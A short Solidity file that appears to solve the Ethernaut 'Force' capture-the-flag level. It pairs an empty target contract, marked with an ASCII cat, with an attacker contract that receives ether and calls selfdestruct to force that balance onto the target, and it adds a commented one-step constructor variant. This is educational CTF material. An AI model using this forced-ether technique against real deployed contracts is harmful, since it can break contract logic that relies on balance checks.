// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract Force_Attacker {
    function getBalance(
        address _contractAddress
    ) external view returns (uint256) {
        return address(_contractAddress).balance;
    }

    receive() external payable {}

    function destroy(address payable _forceContractAddress) external {
        selfdestruct(_forceContractAddress);
    }

    // You may also shorten this to -->
    // constructor(address payable _forceContractAddress) public payable {
    //     selfdestruct(_forceContractAddress);
    // }
}
